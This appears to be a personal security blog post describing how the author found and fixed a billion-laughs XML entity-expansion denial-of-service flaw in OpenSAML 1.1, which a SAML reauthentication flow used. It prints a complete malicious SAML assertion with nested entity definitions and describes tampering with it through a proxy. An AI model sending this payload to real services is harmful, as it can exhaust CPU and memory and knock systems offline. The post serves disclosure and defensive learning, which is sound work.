---
title: "Laughing out loud - Malicious Reauthentication"
date: 2018-06-04T10:02:51+01:00
category: ["security"]
---

![Laughing out loud](/images/laughing_out_loud_malicious_auth_title.png)

# Background

I had found a vulnerability that made it is possible to insert maliciously crafted XML into the SAML payload that a reauthentication application returned to perform a Denial of Service (DoS) attack. The vulnerability came about due to the use of a out-of-date but still widely used library.

The service could have been made to consume a lot of CPU and memory causing it respond very slowly if at all. Health checks and automatic service restarts would have healed the service but it still would have allowed an attacker to mount a sustained Denial of Service attack without needing a lot of requests.

This post describes the vulnerability found in the opensaml-1.1 which was used to reauthenticate request. In this instance the reauthentication between apps worked by sending a payload to the reauthentication app, which then revalidated username/password and then returned the payload as a SAML assertion. This would be sent to the browser and POSTed back to the originating app.

The underlying SAML assertion would look something like that:

```xml
<Assertion xmlns="urn:oasis:names:tc:SAML:1.0:assertion" xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion"
           xmlns:samlp="urn:oasis:names:tc:SAML:1.0:protocol" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" AssertionID="_799fe6f5d865e965f751fb7b5f490530"
           IssueInstant="2018-03-29T13:13:46.244Z" Issuer="redacted.com" MajorVersion="1" MinorVersion="1">
    <Conditions NotBefore="2018-03-29T13:13:46.244Z" NotOnOrAfter="2018-03-29T13:24:46.244Z"></Conditions>
    <AuthenticationStatement AuthenticationInstant="2018-03-29T13:13:46.244Z" AuthenticationMethod="urn:oasis:names:tc:SAML:1.0:am:unspecified">
        <Subject>
            <NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified" NameQualifier="SubjectNameQualifier">SubjectName</NameIdentifier>
        </Subject>
    </AuthenticationStatement>
    <AttributeStatement>
        <Subject>
            <NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified" NameQualifier="SubjectNameQualifier">SubjectName</NameIdentifier>
        </Subject>
        <Attribute AttributeName="sspayload" AttributeNamespace="http://redacted.com">
            <AttributeValue>lHJfAvtsbKuRoknWbaiqTXiP0HUPIk6Iu/JwM5pgsEo=</AttributeValue>
        </Attribute>
        <Attribute AttributeName="payload" AttributeNamespace="http://redacted.com">
            <AttributeValue>iXNKzPtGTrm...sgl7SDiyanNbt6LwIpePh</AttributeValue>
        </Attribute>
    </AttributeStatement>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo>
            <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"></ds:CanonicalizationMethod>
            <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#hmac-sha1"></ds:SignatureMethod>
            <ds:Reference URI="#_799fe6f5d865e965f751fb7b5f490530">
                <ds:Transforms>
                    <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"></ds:Transform>
                    <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#">
                        <ec:InclusiveNamespaces xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" PrefixList="code ds kind rw saml samlp typens #default xsd xsi"></ec:InclusiveNamespaces>
                    </ds:Transform>
                </ds:Transforms>
                <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"></ds:DigestMethod>
                <ds:DigestValue>NObH8OXaRhbv/cIRBNes0Jc5m3c=</ds:DigestValue>
            </ds:Reference>
        </ds:SignedInfo>
        <ds:SignatureValue>89GMiWLrEWThzKpzeDjnCKjs1hI=</ds:SignatureValue>
    </ds:Signature>
</Assertion>
```

so far so good - the XML is protected against tampering by a signature and the payload is encrypted...

# Identifying a Problem

I ran the OWASP dependency checker against the dependencies

```shell script
$ mvn org.owasp:dependency-check-maven:3.1.1:check
```

and found the following vulnerability

```shell script
Published Vulnerabilities
CVE-2013-6440  suppress
Severity: Medium
CVSS Score: 5.0 (AV:N/AC:L/Au:N/C:P/I:N/A:N)
CWE: CWE-200 Information Exposure
The (1) BasicParserPool, (2) StaticBasicParserPool, (3) XML Decrypter, and (4) SAML Decrypter in Shibboleth OpenSAML-Java before 2.6.1 set the expandEntityReferences property to true, which allows remote attackers to conduct XML external entity (XXE) attacks via a crafted XML DOCTYPE declaration.
```

This led me to perform experiments trying to exploit XXE - considering the XML is passed through the browser (so an attacker can modify the XML)

# The Attack

I used [Charles proxy](https://www.charlesproxy.com) to set a breakpoint on the URL POSTing (I was testing this locally) and I modified the payload before it was POSTed back to the app that initiated the reauthentication

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<Assertion xmlns="urn:oasis:names:tc:SAML:1.0:assertion" xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion" xmlns:samlp="urn:oasis:names:tc:SAML:1.0:protocol" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" AssertionID="_ff91848d70cc3eb916a2d0549bb2e11a" IssueInstant="2018-03-29T14:32:38.564Z" Issuer="redacted.com" MajorVersion="1" MinorVersion="1"><Conditions NotBefore="2018-03-29T14:32:38.564Z" NotOnOrAfter="2018-03-29T14:43:38.564Z"></Conditions><AuthenticationStatement AuthenticationInstant="2018-03-29T14:32:38.564Z" AuthenticationMethod="urn:oasis:names:tc:SAML:1.0:am:unspecified"><Subject><NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified" NameQualifier="SubjectNameQualifier">SubjectName</NameIdentifier></Subject></AuthenticationStatement><AttributeStatement><Subject><NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified" NameQualifier="SubjectNameQualifier">SubjectName</NameIdentifier></Subject><Attribute AttributeName="sspayload" AttributeNamespace="http://redacted.com"><AttributeValue>NeGxMf9WPEcFqN7J7mfmW0G0pBOUO5nvhXj71WqxeuE=</AttributeValue></Attribute><Attribute AttributeName="payload" AttributeNamespace="http://redacted.com"><AttributeValue>iXNKzPtGTrmBZ/...A4tKERF1nFJRJE5DSqnJZc4wd1QU3C5S</AttributeValue></Attribute></AttributeStatement><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#">&lol9;</ds:CanonicalizationMethod>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#hmac-sha1"></ds:SignatureMethod>
        <ds:Reference URI="#_ff91848d70cc3eb916a2d0549bb2e11a">
            <ds:Transforms>
                <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"></ds:Transform>
                <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"><ec:InclusiveNamespaces xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" PrefixList="code ds kind rw saml samlp typens #default xsd xsi"></ec:InclusiveNamespaces></ds:Transform>
            </ds:Transforms>
            <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"></ds:DigestMethod>
            <ds:DigestValue>NObH8OXaRhbv/cIRBNes0Jc5m3c=</ds:DigestValue>
        </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>89GMiWLrEWThzKpzeDjnCKjs1hI=</ds:SignatureValue>
</ds:Signature></Assertion>
```

The embedded doctype and the LOL entities that result in the XML processor processing a LOT of "lol" ENTITIES - hence the name billion laugh attack.

Here is what it did to my local JVM:

![](/images/laughing_out_loud_malicious_auth_stats.png)

 and that is just a single request.

# Mitigation

I rewrote the code to use OpenSAML 3.3 which is not vulnerable. Unfortunately, as the API for OpenSAML changed significantly that wasn't just a matter of changing dependencies but rewriting the SAML generation code from scratch...

# Moral of the Story

*   Do not use outdated libs
*   Do run the OWASP checker
*   XML is evil
